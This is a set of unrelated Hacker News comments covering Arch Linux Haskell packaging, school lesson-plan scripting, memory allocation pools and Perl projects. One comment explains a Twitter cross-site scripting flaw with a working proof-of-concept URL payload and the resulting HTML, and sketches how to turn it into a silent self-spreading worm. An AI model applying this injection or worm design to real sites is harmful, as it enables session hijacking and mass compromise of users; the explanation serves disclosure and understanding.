One approach is to have a system that packages everything in the language-specific repository for the distro.  Haskell on Archlinux is an example of this.<p>I'm not a fan of actually using the language-specific packages because I like the rolling release model and end up having to do some manual work to reinstall all my packages when the distro upgrades it's copy (or switch to the next 6-month release with Ubuntu and similar).",1285073998

If something like this was released it would spread like wildfire.<p>Reminds me of the MySpace worm that took the site down<p>Time to change your passwords!<p>(Edit: I will post the vuln code once this is patched. Atm I am playing with having the payload make Ajax queries back to Twitter :). Having shortcut functions in the page (ie. $() to grab an element), url shorteners and ability to include external JS mean that you can do almost anything in the 140 char payload.<p>Explainer:<p>The vulnerability is because URL's are not being escaped properly. For eg. the following URL is posted to Twitter:<p><pre><code>  http://thisisatest.com/@""onmouseover=""alert('test xss')""/
</code></pre>
Twitter treats this as the URL. When it is parsed Twitter wraps a link around that code, so the HTML now looks like:<p><pre><code>  <a href=""http://thisisatest.com/@""onmouseover=""alert('test xss')""rel/"" target=""_blank"" ="""">http://thisisatest.com/@""onmouseover=""alert('test xss')""/</a></span> 
</code></pre>
You can see that by putting in the URL and the trailing slash, Twitter thinks it has a valid URL even though it contains a quote mark in it which allows it to escape the URL attribute and include a mouse over. You can write anything to the page, including closing the link and including a script element.<p>You don't have to use onmouseover. You could close the link and then insert some external javascript that can re-write your tweet to make it look innocent (or hide that entire tweet), then attach a mousemove event to the body document. This means you could propagate a worm silently and without requiring a mouseover on the actual tweet.<p>(edit: pretty concerned about the number of people here who think that being able to inject javascript on a site in the context of a users session is not a big deal)",1285072444

In addition to this, I do research with a former professor of education, and maintain a pretty wide network of friends and professional contacts who are teachers.<p>And, depending on the grade and on the school, it is like this.<p>The professor whom I work with has this as one of her primary research areas, and has told me story after story of going into elementary schools (particularly on the western, less populated half of our state) in which teacher-student interactions are scripted down to the minute, and teachers are evaluated based on whether or not they follow the script.<p>The major high school across the street from where I live (~1500 students) has a science department where none of the teachers have written their own lesson plans in about 3 years; they use the lesson plans in the district binder (I've taught from those lesson plans; they're barely rigorous, and conflate superficial knowledge memorization with actual learning).<p>A friend of mine is a language and communication arts teacher in a middle school; if he wants to deviate from the lesson plan binder, he has to submit a proposal for the new unit (there can't just be one lesson) during the summer, at which point it's at the mercy of the committee.<p>While I was teaching in Kansas, my lesson plans were written for me, and I was punished any time I went away from them, even when it was clear that my students needed more time with something before they understood it (""If you were a good teacher, and if they were paying attention, they'd get it the first time. Make them come in during lunch."").<p>There are plenty of holdouts, thankfully; schools which serve mostly affluent students (particularly schools with strong enough test results that they can get away with it) seem to have done well. Additionally, there are a lot of more urban schools which serve students who are not quite so affluent and which have managed to hold out, though I suspect some of this is an accident of the difficulties of administrating a big school in which math is the least of most students' worries.",1285072085

Instead of allocating memory for foo 10000 times, older allocations are kept in a pool and reused for subsequent iterations. So the actual cost of -alloc is just a memset (i.e. nothing). Java's GCs are much more mature, so I would assume they have the same optimisation.",1285072071

All valid points, but... I don't want to sound cruel, but a steady progress solving hard problems is not very valuable per se to the [potential] users of the software or employers of the participants. They usually care much more about results. If you deliver the results without much progress and avoiding hard problems, you're fine; if you do a lot of progress working through hard problems without practically useful results, you're screwed.<p>You say your software works; fine, but for what definition of ""work""? ""Passes tests"" is one thing, but ""usable for production heavy lifting"" is something in a completely different league.

I have my share of doubts wrt this part (so does the author of the article, IIRC), but let's skip it. My bigger point is, is it what users and employers want? I honestly don't see it. Please don't misunderstand me here; I'm not saying you must do what some other people want. You, of course, are free to do whatever, I (or anybody else) is not in position to tell you what to do. But then again, when other people (production perl users, potential investors, employers and contributors -- in short, industry people, not research people) judge your projects, their judgments will probably be aligned with their very specific industrial needs, not with potential research value and/or some decades-long perspective.",1285070910
